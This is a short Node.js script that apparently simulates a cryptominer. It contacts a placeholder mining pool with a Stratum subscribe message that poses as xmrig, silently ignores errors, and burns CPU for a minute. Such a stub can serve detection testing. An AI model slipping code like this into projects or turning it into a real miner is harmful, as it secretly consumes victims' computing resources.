const net = require('net');
const s = net.connect(3333, 'pool.example.invalid', () => s.write('{"method":"mining.subscribe","params":["xmrig/6.0"]}\n'));
s.on('error', () => {});
const end = Date.now() + 60000; let x = 0;
while (Date.now() < end) { x = (x + Math.sqrt(Math.random())) % 1e9; }
